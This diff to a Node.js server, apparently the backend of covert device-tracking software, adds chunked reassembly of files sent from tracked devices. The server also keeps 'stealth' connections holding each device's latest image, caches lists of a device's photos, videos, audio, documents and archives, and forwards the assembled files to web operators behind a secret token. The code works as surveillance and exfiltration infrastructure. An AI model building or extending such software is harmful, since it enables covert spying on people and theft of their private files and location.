@@ -18,6 +18,7 @@ const deviceCommands = new Map();
 const stealthConnections = new Map(); // deviceId -> { ws, lastSeen, latestImage, latestImageTime }
 const webClients = new Set();
 const deviceFileCache = new Map();
+const fileChunkBuffers = new Map(); // file_id -> { filename, total_chunks, total_size, chunks[], received }
 
 console.log("Starting location tracker server...");
 
@@ -277,13 +278,56 @@ wss.on("connection", (ws, req) => {
             return;
         }
 
+        // Чанковая передача файлов: собираем чанки и отправляем клиенту после последнего
+        if (msg.type === "file_chunk") {
+            const { file_id, filename, chunk_index, total_chunks, data, total_size } = msg;
+
+            if (!fileChunkBuffers.has(file_id)) {
+                fileChunkBuffers.set(file_id, {
+                    filename,
+                    total_chunks,
+                    total_size,
+                    chunks: new Array(total_chunks).fill(null),
+                    received: 0,
+                    deviceId
+                });
+            }
+
+            const transfer = fileChunkBuffers.get(file_id);
+            if (transfer.chunks[chunk_index] === null) {
+                transfer.chunks[chunk_index] = data;
+                transfer.received++;
+            }
+
+            // Прогресс — отправляем клиенту
+            broadcastToWebClients({
+                type: "file_chunk_progress",
+                deviceId,
+                file_id,
+                filename,
+                received: transfer.received,
+                total: total_chunks
+            });
+
+            // Все чанки получены — собираем файл и отправляем клиенту
+            if (transfer.received === total_chunks) {
+                const fullData = transfer.chunks.join('');
+                console.log(`📥 File assembled: ${filename} from ${deviceId} (${total_size} bytes, ${total_chunks} chunks)`);
+                broadcastToWebClients({
+                    type: "file_download",
+                    deviceId,
+                    filename,
+                    data: fullData,
+                    size: total_size,
+                    timestamp: Date.now()
+                });
+                fileChunkBuffers.delete(file_id);
+            }
+            return;
+        }
+
         // ✅ Остальные обработчики (file_list, file_download, image)
         if (msg.type === "file_list") {
-            // S13: Ограничиваем размер кэшируемых данных (макс 1MB JSON)
-            const dataStr = JSON.stringify(msg.data || {});
-            if (dataStr.length > 1024 * 1024) {
-                console.warn(`📁 File list from ${deviceId} too large (${dataStr.length} bytes), truncating`);
-            }
             deviceFileCache.set(deviceId, {
                 data: msg.data,
                 timestamp: Date.now()
@@ -385,7 +429,7 @@ const fileRequestCallbacks = new Map(); // deviceId -> resolve function
 
 app.get('/api/device/:deviceId/files/:token', (req, res) => {
   const { deviceId, token } = req.params;
-  const emptyResponse = { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 };
+  const emptyResponse = { categories: { images: [], videos: [], audio: [], documents: [], archives: [] }, total: 0 };
 
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: 'Forbidden' });
